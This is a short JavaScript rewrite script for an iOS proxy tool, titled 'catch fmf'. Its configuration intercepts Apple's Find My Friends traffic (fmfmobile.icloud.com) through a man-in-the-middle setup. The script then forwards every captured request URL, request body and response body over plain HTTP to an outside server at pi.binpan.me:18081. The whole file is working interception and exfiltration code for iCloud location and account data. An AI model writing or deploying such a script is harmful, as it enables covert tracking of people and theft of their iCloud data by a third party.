/*************************************
项目名称：catch fmf
**************************************

[rewrite_local]
^https?:\/\/.*fmfmobile\.icloud\.com(\.cn)?\/ url script-response-body https://raw.githubusercontent.com/tiny1990/tiny1990.github.io/refs/heads/master/catch.js

[mitm]
hostname = *fmfmobile.icloud.com,*fmfmobile.icloud.com.cn

*************************************/
let requestBody = $request.body || '';
let responseBody = $response.body || '';
let requestUrl = $request.url;

// 构造要发送的数据
let payload = {
    request: {
        url: requestUrl,
        body: requestBody
    },
    response: {
        body: responseBody
    }
};

const request = {
    url: 'http://pi.binpan.me:18081/body',
    method: 'POST', // HTTP请求方法
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload)
};

$task.fetch(request).catch(error => {
    console.error('请求失败:', error);
});

$done({});
